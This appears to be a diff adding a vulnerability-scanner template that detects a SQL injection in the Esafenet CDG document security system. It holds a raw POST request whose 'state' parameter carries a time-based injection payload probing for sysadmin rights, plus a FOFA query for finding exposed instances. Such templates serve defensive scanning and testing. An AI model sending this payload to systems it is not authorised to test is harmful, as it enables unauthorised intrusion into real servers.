@@ -1,0 +1,42 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - contains(content_type,"text/html")
+    - "contains(body,\"\u64CD\u4F5C\u6210\u529F\")"
+    - status_code == 200
+    type: dsl
+  raw:
+  - 'POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    command=updateNetSec&state=123'';if (select IS_SRVROLEMEMBER(''sysadmin''))=1
+    WAITFOR DELAY ''0:0:5''--
+
+    '
+id: esafenet-netsecconfigajax-sqli
+info:
+  author: adeljck
+  classification:
+    cpe: cpe:2.3:a:esafenet:cdg:*:*:*:*:*:*:*:*
+  description: 'The `state` parameter of the `NetSecConfigAjax` interface of the Yisaitong
+    electronic document security management system does not pre-compile and adequately
+    verify the incoming data, resulting in a SQL injection vulnerability in the interface.
+    Malicious attackers may obtain the server through this vulnerability information
+    or directly obtain server permissions.
+
+    '
+  metadata:
+    fofa-query: "title=\"\u7535\u5B50\u6587\u6863\u5B89\u5168\u7BA1\u7406\u7CFB\u7EDF\
+      \",body=\"CDGServer3/\""
+    max-request: 1
+    product: cdg
+    vendor: esafenet
+    verified: true
+  name: Esafenet CDG NetSecConfigAjax - Sql Injection
+  severity: high
+  tags: esafenet,sqli,vuln
